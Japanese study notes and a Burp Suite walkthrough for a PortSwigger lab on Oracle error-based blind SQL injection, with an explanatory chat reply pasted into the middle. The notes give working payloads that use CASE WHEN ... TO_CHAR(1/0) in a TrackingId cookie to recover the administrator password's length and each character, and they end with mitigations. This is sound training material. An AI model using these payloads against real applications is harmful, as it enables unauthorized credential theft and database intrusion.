## 🔥 これはどんな脆弱性か（本質）
アプリが SQL の結果をレスポンスに反映しないため、  
**True/False の差分がレスポンス内容に出ない** → 通常のBlind SQLiが効かない。

しかし、  
**条件がTrueのときだけ意図的にSQLエラーを発生させる**  
ことで、  
- True → HTTP 500  
- False → HTTP 200  
という差分が生まれ、内部情報を1ビットずつ推測できる。

Oracleでは `CASE WHEN ... THEN TO_CHAR(1/0)` を使ってゼロ除算エラーを起こす。

---

## 🧭 どう気づくか（検出ポイント）
1. **Cookieやパラメータに ' を入れて500エラーが出る**  
   → SQLとして解釈されている可能性が高い。

2. **Boolean条件を入れてもレスポンス内容が変わらない**  
   - `' AND 1=1--` → 200  
   - `' AND 1=0--` → 200  
   → 通常のBlind SQLiは無効。

3. **CASE + 1/0 を入れると挙動が変わる**  
   - True → 500  
   - False → 200  
   → error-based blind が成立。

---

## 🎯 どう攻撃するか（攻撃フロー）
### 1. Oracle特有の構文確認
`'||(SELECT '' FROM dual)||'`  
→ エラーが消えれば Oracle 確定。

### 2. 条件分岐でエラーを発生させる
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'
```
True → 500  
False → 200

### 3. パスワード長の特定
```sql
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```
IntruderのNumbersで1〜30を総当たり → 長さが判明。

### 4. パスワードを1文字ずつ抽出
```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```
- 500 → 正解  
- 200 → 不正解  

Burp Intruder（Brute forcer or Cluster bomb）で自動化。

---

## 🛡️ どう対策するか（実務レベル）
- **プリペアドステートメント（パラメータ化クエリ）**  
  SQL文とデータを完全に分離する。最重要。
- **入力値のサニタイズ・エスケープ**  
  特に文字列連結を禁止。
- **エラーメッセージをユーザーに返さない**  
  ただし error-based blind はエラー非表示でも成立するため補助的。
- **レスポンスの統一**  
  成功/失敗でHTTPステータスやレスポンス時間を変えない。
- **WAF・レート制限**  
  Intruderのような大量リクエストを抑止。

---

## 🧩 30秒面接用まとめ（暗記用）
> **「Error-based Blind SQL Injection は、通常のBlind SQLiが効かない状況で、  
> 条件がTrueのときだけ意図的にSQLエラー（1/0など）を発生させ、  
> HTTP 500 と 200 の差分から内部情報を推測する攻撃です。  
> Oracleでは `CASE WHEN ... THEN TO_CHAR(1/0)` を使います。  
> これを利用してパスワード長や各文字を1文字ずつ抽出できます。  
> 対策はプリペアドステートメントの徹底、エラー非表示、レスポンス統一、  
> そしてレート制限やWAFの導入です。」**

---


了解、和志。  
この長い手順を **そのまま読みやすい Markdown** に整形したよ。  
内容は一切削らず、構造だけ綺麗にしてあるから、このままノートにも面接準備にも使える。

<br>
<br>
<br>
<br>
<br>
<br>

---

# Lab: Blind SQL Injection with Conditional Errors  
## Burp Suite を使った攻撃手順（完全版）

---

# **ステップ1: 準備**

## **1-1. Burp Suite を起動**
- Burp Suite 起動  
- **Proxy** タブ → **Intercept** タブ  
- **Intercept is on** を確認（オフならオンにする）

## **1-2. ブラウザで Lab にアクセス**
- PortSwigger Academy → **ACCESS THE LAB**  
- 新しいタブでショップページが開く  
- 右上の **My account** をクリック → ログイン画面へ

## **1-3. リクエストをキャッチ**
- Burp → **Proxy → HTTP history**  
- `/login` の GET リクエストを探す  
- 右クリック → **Send to Repeater**  
- 上部に **Repeater** タブが追加される

---

# **ステップ2: 脆弱性の確認**

## **2-1. Repeater を開く**
- 上部の **Repeater** タブをクリック  
- 左：リクエスト  
- 右：レスポンス

## **2-2. TrackingId を見つける**
- Cookie ヘッダ内の  
  `TrackingId=xyz123abc456` を確認

## **2-3. シングルクォートを追加**
```
TrackingId=xyz123abc456'
```
- **Send**  
- レスポンスが **500 Internal Server Error** → OK

## **2-4. Render 表示で確認**
- Response → **Render**  
- エラーページが表示される

---

# **ステップ3: SQL として解釈されているか確認**

## **3-1. True 条件をテスト**
```
TrackingId=xyz123abc456' AND 1=1 --
```
- **Send** → **200 OK**

## **3-2. False 条件をテスト**
```
TrackingId=xyz123abc456' AND 1=0 --
```
- **Send** → **200 OK（変化なし）**

→ **Boolean-based Blind SQLi が効かない** ことを確認

<br>


---

# 🎯 **なぜ True 条件も False 条件も 200 OK になるのか？**

ここが **Boolean-based Blind SQLi が効かない理由の核心**。

---

# ✅ **まず通常の Blind SQLi（Boolean-based）の仕組み**
本来なら：

| 条件 | SQL の結果 | レスポンス |
|------|------------|------------|
| `1=1`（True） | データが返る | ページの内容が変わる |
| `1=0`（False） | データが返らない | ページの内容が変わる |

この **レスポンスの違い** を利用して内部情報を推測する。

---

# ❌ **しかしこの Lab のアプリは “レスポンスを変えない”**

つまり：

```
TrackingId=xxx' AND 1=1 --
```

→ 200 OK（普通のページ）

```
TrackingId=xxx' AND 1=0 --
```

→ 200 OK（普通のページ）
  
**True でも False でも同じレスポンスを返すように作られている。**

---

# 🔥 **つまりアプリはこういう動きをしている**

```
SQL が成功したかどうかは気にしない
クエリの結果も気にしない
とりあえず毎回同じページを返す
```

だから、**条件が True か False かをレスポンス内容で判別できない**。

---

# 🧠 **これが「Boolean-based Blind SQLi が効かない」という意味**

Boolean-based は  
**True/False の違いがレスポンスに出ることが前提**。

でもこのアプリは：

- True → 200  
- False → 200  

→ **差がないので推測できない**

---

# 🔥 だから “エラーを使う” という裏技が必要になる

アプリはレスポンス内容は変えないけど、  
**SQL エラーが起きたときだけ 500 を返す**。

つまり：

| 条件 | SQL の動作 | レスポンス |
|------|------------|------------|
| True | わざと 1/0 でエラー | **500** |
| False | エラーなし | **200** |

これなら差が出る。

---

# 🎉 **まとめるとこういうこと**

### ✔ Boolean-based が効かない理由  
アプリが **True/False でレスポンスを変えない**から。

### ✔ だから conditional error を使う  
**True のときだけ SQL エラーを起こす**ようにして、  
500 / 200 の差で内部情報を推測する。

---

# 🔥 超短い理解メモ（覚えやすい版）

> **このアプリは、SQL の結果が True でも False でも同じページを返す。  
> だから普通の Blind SQLi では判定できない。  
> でも SQL エラーが起きたときだけ 500 を返すので、  
> “True のときだけエラーを起こす” という仕組みを作れば  
> 500/200 の差で内部情報を抜ける。**

<br>

---

# 🔥 **通常の Blind SQLi（Boolean-based）は “レスポンスの違い” を使う**
普通の Blind SQLi は、SQL の結果が True か False かで  
**アプリの挙動が変わる**ことを利用する。

例えば：

### ✔ ページの内容が変わる  
- True → 商品一覧が表示される  
- False → 「商品がありません」が表示される  

### ✔ HTML の長さが変わる  
- True → 5000 bytes  
- False → 4800 bytes  

### ✔ 特定の文字列が出る/出ない  
- True → “Welcome back!”  
- False → “Invalid user”  

### ✔ リダイレクトの有無  
- True → /home にリダイレクト  
- False → /login に留まる  

### ✔ HTTP ステータスが変わる  
- True → 200  
- False → 302  

---

# ❌ **でもこの Lab は “レスポンスを変えない”**
このアプリは、SQL の結果がどうであれ：

- ページ内容 → **毎回同じ**
- HTML の長さ → **毎回同じ**
- 表示される文字 → **毎回同じ**
- ステータス → **毎回 200**

つまり、通常の Blind SQLi が使う **差分が一切ない**。

だから：

```
AND 1=1 --
AND 1=0 --
```

どっちも **200 OK**  
どっちも **同じページ**  
どっちも **同じ長さ**

→ **True/False の判定ができない**

---

# 🔥 **だから “エラーの有無” を差分として使う必要がある**
アプリはレスポンス内容は変えないけど、  
**SQL エラーが起きたときだけ 500 を返す**。

これが唯一の差分。

| 条件 | SQL の動作 | レスポンス |
|------|------------|------------|
| True | わざと 1/0 でエラー | **500** |
| False | エラーなし | **200** |

これなら判定できる。

---

# 🎯 **つまり

> **通常の Blind SQLi は、ページ内容・HTML長・文字列・リダイレクト・ステータスなどの“レスポンスの違い”で True/False を判断する。  
> しかしこの Lab はそれらが全部同じなので、唯一変わる“SQL エラーの有無（500/200）”を使って判定する必要がある。**
もちろん、ここは **理解した瞬間に一気に視界が開けるポイント**だから、和志がここを押さえるのはめちゃくちゃ大事。

結論からいくと——

# 🔥 **SQLエラー = データベースが「このSQL無理！」って返してくるエラー**



---

# 🧩 **SQLエラーって具体的にどんなもの？**

代表的なものを例で見たほうが早い。

## ① **構文エラー（Syntax error）**
SQL文が壊れてるとき。

例：
```
SELECT * FROM users WHERE username='admin'
```
に `'` を追加して壊すと：

```
SELECT * FROM users WHERE username='admin''
```

→ DB「クォート多すぎて意味わからん！」  
→ **SQLエラー**

---

## ② **ゼロ除算エラー（division by zero）**
数学的に不可能な計算をさせたとき。

```
SELECT 1/0 FROM dual;
```

→ DB「0で割るのは無理！」  
→ **SQLエラー**

今回のLabで使ったのはこれ。

---

## ③ **型変換エラー（type conversion error）**
数字に変換できない文字列を数字に変換しようとしたとき。

```
SELECT TO_NUMBER('abc') FROM dual;
```

→ DB「abcを数字にできへん！」  
→ **SQLエラー**

---

## ④ **存在しないテーブル・カラム参照**
```
SELECT * FROM userz;
```

→ DB「そんなテーブルない！」  
→ **SQLエラー**

---

# 🔥 **このLabで重要なのは “SQLエラーが起きるとHTTP 500になる” という仕様**

アプリは SQL の結果がどうであれページ内容は変えないけど、

- SQLが正常 → **200 OK**
- SQLがエラー → **500 Internal Server Error**

という **唯一の差分** がある。

だから攻撃者はこう考える：

> **True のときだけ SQLエラーを起こせば、  
> True = 500 / False = 200 で判定できるやん！**

これが **conditional error-based blind SQLi** の本質。

---

# 🎯 **つまり

> **SQLエラーとは、SQL文が壊れていたり、計算できない処理をさせたときに  
> データベースが返すエラーのこと。  
> このLabでは SQLエラーが起きたときだけ HTTP 500 が返るので、  
> それを利用して True/False を判定する。**


<br>

---

# **ステップ4: エラーベースの仕組みを作る**

## **4-1. False 条件（エラーなし）**
```
TrackingId=xyz123abc456'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'
```
- **Send** → **200 OK**

## **4-2. True 条件（エラー発生）**
```
TrackingId=xyz123abc456'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'
```
- **Send** → **500 Internal Server Error**

→ **True = 500 / False = 200** の判定軸が完成

---

# **ステップ5: パスワード長を調べる**

## **5-1. 手動でテスト**
```
TrackingId=xyz123abc456'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```
- **500** → パスワードは 1 文字より長い

## **5-2. Intruder に送る**
- Repeater → 右クリック → **Send to Intruder**

## **5-3. Intruder 設定（Positions）**
- **Clear §**  
- `>1` の **1** を選択 → **Add §**  
→ `>§1§`

## **5-4. Payload 設定（Numbers）**
- Payload type → **Numbers**  
- From: 1  
- To: 30  
- Step: 1

## **5-5. 攻撃開始**
- **Start attack**

## **5-6. 結果を読む**
- 500 → True（長い）  
- 200 → False（それ以下）

例：
- 19 → 500  
- 20 → 200  

→ **パスワード長 = 20**

---

# **ステップ6: パスワードを1文字ずつ抽出（簡単版）**

## **6-1. Repeater に戻る**

## **6-2. 1文字目をテスト**
```
TrackingId=xyz123abc456'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```
- **200** → a ではない

## **6-3. Intruder に送る**

## **6-4. Positions 設定**
- **Clear §**  
- `'a'` の **a** を選択 → **Add §**  
→ `='§a§'`

## **6-5. Payload 設定（Brute forcer）**
- Character set:  
  `abcdefghijklmnopqrstuvwxyz0123456789`  
- Min length: 1  
- Max length: 1

## **6-6. 攻撃開始**
- 500 が出た文字が正解

## **6-7. 2文字目以降**
- `SUBSTR(password,2,1)` に変更  
- 20回繰り返す

---

# **ステップ7: 完全自動化（Cluster bomb）**

## **7-1. Repeater で準備**
```
TrackingId=xyz123abc456'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```

## **7-2. Intruder → 2箇所マーク**
- SUBSTR の位置 → **Add §**  
- 文字 → **Add §**

## **7-3. Attack type**
- **Cluster bomb**

## **7-4. Payload 1（位置）**
- Numbers  
- 1〜20

## **7-5. Payload 2（文字）**
- Brute forcer  
- 1文字

## **7-6. 攻撃開始（約2時間）**

## **7-7. 結果整理**
- Status = 500 の行だけ見る  
- Payload1 = 位置  
- Payload2 = 文字

## **7-8. パスワード完成**
例：
```
k933lfl576togzmifq29
```

---

# **ステップ8: ログイン**
- Username: administrator  
- Password: 抽出したパスワード  
- **Log in** → Congratulations

---


